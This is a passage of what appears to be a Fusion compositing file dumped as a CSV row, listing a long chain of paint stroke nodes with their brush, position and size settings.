id,title,username,language,date,content
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.856833398342133, 0.747144520282745 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke100 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378917629 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke99"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.734344244003296, 0.744387567043304 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke99 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378916234 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke98"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.728042542934418, 0.741630554199219 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke98 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378914869 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke97"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.706774294376373, 0.733753442764282 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke97 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378913099 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke96"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.676053583621979, 0.697124838829041 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke96 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378911074 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke95"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.642181932926178, 0.695549428462982 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke95 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378909499 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke94"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.577195763587952, 0.642378866672516 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke94 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378907744 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke93"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.673690438270569, 0.746750712394714 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke93 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378905853 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke92"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.64060652256012, 0.730602622032166 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke92 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378902884 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke91"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.854076385498047, 0.799133539199829 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke91 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378900574 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke90"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.836746752262115, 0.8089799284935 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke90 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378898609 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke89"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.826900362968445, 0.845214664936066 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke89 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378896749 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke88"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.715833008289337, 0.811736881732941 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke88 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378894994 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke87"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.65045291185379, 0.785742402076721 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke87 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378893389 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke86"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.592556118965149, 0.772745192050934 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke86 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378891649 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke85"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.589405298233032, 0.803465902805328 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke85 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378887614 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke84"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.819023251533508, 0.873572289943695 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke84 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378885513 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke83"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.849350154399872, 0.884994089603424 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke83 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378883053 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke82"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.904489934444427, 0.948011040687561 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke82 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378880264 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke81"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.876132309436798, 0.9617959856987 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke81 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378878523 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke80"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.629972457885742, 0.869239866733551 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke80 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378877368 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke79"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.595313131809235, 0.850728631019592 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke79 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378875688 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke78"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.556715250015259, 0.862150430679321 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke78 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378874503 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke77"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.531508445739746, 0.859787344932556 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke77 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378871563 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke76"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.550019681453705, 0.809767603874207 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke76 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378870108 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke75"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.540173292160034, 0.722725510597229 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke75 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378867273 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke74"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.475974798202515, 0.62780624628067 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke74 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378865968 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke73"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.455888152122498, 0.616778254508972 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke73 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378864258 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke72"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.437376916408539, 0.639228045940399 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke72 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378862593 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke71"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.427924364805222, 0.582118928432465 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke71 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378860013 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke70"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.438558489084244, 0.712879061698914 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke70 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378858063 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke69"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.403505325317383, 0.722331643104553 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke69 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378855888 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke68"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.39759749174118, 0.668373346328735 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke68 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378853938 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke67"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.383418679237366, 0.653012990951538 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke67 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378852048 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke66"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.38066166639328, 0.695943295955658 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke66 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378850023 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke65"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.345214664936066, 0.705789685249329 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke65 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378846993 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke64"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.325127989053726, 0.642772734165192 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke64 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378845313 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke63"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.298739671707153, 0.640409588813782 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke63 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378843528 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke62"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.325915724039078, 0.749113798141479 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke62 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378840918 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke61"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.420441120862961, 0.803072094917297 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke61 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378838983 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke60"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.457463562488556, 0.882237076759338 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke60 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378837153 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke59"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.462189853191376, 0.905474603176117 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke59 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378834708 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke58"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.447617173194885, 0.950767993927002 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke58 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378833013 }
			},
			IsThreaded = true,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke57"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.361756592988968, 0.952737271785736 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke57 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378830478 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke56"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.314493894577026, 0.825915694236755 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke56 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378828513 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke55"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.276289880275726, 0.799921214580536 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke55 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378823413 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke54"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.245569124817848, 0.810555338859558 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke54 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378821447 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke53"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
